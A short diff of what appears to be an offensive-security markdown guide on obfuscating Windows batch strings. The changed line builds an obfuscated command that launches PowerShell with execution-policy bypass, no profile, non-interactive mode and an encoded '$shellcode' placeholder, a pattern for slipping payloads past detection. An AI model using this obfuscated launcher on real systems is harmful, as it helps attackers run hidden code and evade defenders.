@@ -89,7 +89,7 @@ The above string can be obfuscated using the **batch special character: ^** <br 
 - String obfuscated (**test.bat**)<br />
 
       @echo off
-      %comspec% /c start p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
+      %comspec% /c p%A%owe%B%rshell.e%C%xe -n%C%op -E%A%xec B%C%yp%B%ass -n%A%oni -e%A%nc $shellcode
 
 ![batch obfuscation](http://i.cubeupload.com/nMLRrc.jpg)
 
